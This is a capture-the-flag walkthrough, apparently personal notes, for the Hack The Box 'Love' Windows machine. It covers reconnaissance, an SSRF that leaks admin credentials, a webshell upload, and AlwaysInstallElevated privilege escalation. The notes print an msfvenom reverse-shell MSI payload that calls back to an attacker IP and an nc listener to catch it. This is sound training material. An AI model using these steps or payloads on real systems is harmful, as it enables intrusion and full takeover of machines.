## Intro

Tags: #windows #OSCPpath #WebApp #SSRF #FileUpload #AlwaysInstallElevated #easy 

--------
# Reconnaissance

## Port scan

```shell
sudo nmap -sC -sV -oA love.htb love-htb-scan
```

```shell
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-10 15:17 UTC
Nmap scan report for 10.10.10.239
Host is up (0.56s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings:
|   Help:
|_    Host '10.10.14.3' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=5/10%Time=60994EFA%P=x86_64-pc-linux-gnu%r(He
SF:lp,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.3'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h41m34s, deviation: 4h02m31s, median: 21m32s
| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-10T08:41:16-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-10T15:41:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.47 seconds

```

## WebApp

navigate to `http://love.htb`
![](MediaFiles/Pasted%20image%2020260927152536.png)

### Directories

```shell
┌──(root💀kali)-[~/hackthebox/machine/love]
└─# gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.239
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/02 04:06:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/] 
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
/dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]    
/licenses             (Status: 403) [Size: 421]                                     
/examples             (Status: 503) [Size: 402]                                     
/IMAGES               (Status: 301) [Size: 338] [--> http://10.10.10.239/IMAGES/]  
/%20                  (Status: 403) [Size: 302]                                     
/Admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/Admin/]   
/*checkout*           (Status: 403) [Size: 302]                                     
/Plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/Plugins/] 
/phpmyadmin           (Status: 403) [Size: 302]                                     
/webalizer            (Status: 403) [Size: 302]                                     
/*docroot*            (Status: 403) [Size: 302]                                     
/*                    (Status: 403) [Size: 302]                                     
/con                  (Status: 403) [Size: 302]                                     
/http%3A              (Status: 403) [Size: 302]                                     
/Includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/Includes/]
/**http%3a            (Status: 403) [Size: 302]

```

`/admin` is a login page, and we dont have creds for it 
### Port 443

forbidden

### Port 5000

forbidden too, but:
### Vhost discovered

checking the https certificate we find a new vhost, add it also to etc/hosts
```shell
10.10.10.239    staging.love.htb
```
![](MediaFiles/Pasted%20image%2020260927152937.png)going to `Demo` page:
![](MediaFiles/Pasted%20image%2020260927153239.png)

-------
# Foothold

## SSRF

lets input `localhost:500` on the url on demo page
![](MediaFiles/Pasted%20image%2020260927153530.png)
it was successful!

#### creds obtained

```
admin
@LoveIsInTheAir!!!!
```

now lets use this creds to login on `/admin`
`https://love.htb/admin`
### Admin webapp login
we are in, this is the admin portal:
![](MediaFiles/Pasted%20image%2020260927153500.png)

### File upload

on Admin profile i found out there is file upload:
![](MediaFiles/Pasted%20image%2020260927153727.png)

## Shell as phoebe

lets upload this 
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
then navigate here to use it `http://love.htb/images/shell.php`
![](MediaFiles/Pasted%20image%2020260927154027.png)
we can run commands successfully as user `phoebe` , got user flag

-----
# Privesc

## WinPeas

upload and run winpeas
![](MediaFiles/Pasted%20image%2020260927154703.png)

### AlwaysInstallElevated

is a registry-based Group Policy setting that tells the Windows Installer service to always run MSI installs as SYSTEM, no matter who's running them

#### Payload

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.247 LPORT=3333 -f msi -o Application.msi
```

## Shell as Administrator

```shell
nc -lvnp 3333
```
now execute the payload
```powershell
cmd.exe /c C:\xampp\htdocs\omrs\images\Application.msi
```
got Administrator shell, grab root flag

-----
# Summary